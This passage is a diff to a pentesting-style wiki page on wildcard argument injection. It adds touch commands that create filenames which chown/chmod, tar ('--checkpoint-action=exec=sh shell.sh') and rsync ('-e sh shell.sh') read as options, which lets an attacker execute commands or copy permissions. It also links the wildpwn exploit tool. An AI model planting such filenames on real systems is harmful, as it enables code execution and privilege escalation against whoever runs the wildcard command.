@@ -1,5 +1,46 @@
 # Wildcards Spare tricks
 
+### chown, chmod
+
+You can **indicate which file owner and permissions you want to copy for the rest of the files**
+
+```bash
+touch "--reference=/my/own/path/filename"
+```
+
+You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _\(combined attack\)_  
+More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+
+### Tar
+
+**Execute arbitrary commands:**
+
+```bash
+touch "--checkpoint=1"
+touch "--checkpoint-action=exec=sh shell.sh"
+```
+
+You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _\(tar attack\)_  
+More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+
+### Rsync
+
+**Execute arbitrary commands:**
+
+```bash
+Interesting rsync option from manual:
+
+ -e, --rsh=COMMAND           specify the remote shell to use
+     --rsync-path=PROGRAM    specify the rsync to run on remote machine
+```
+
+```bash
+touch "-e sh shell.sh"
+```
+
+You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _\(_rsync _attack\)_  
+More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+
 ### 7z
 
 In **7z** even using `--` before `*` \(note that `--` means that the following input cannot treated as parameters, so just file paths in this case\) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:
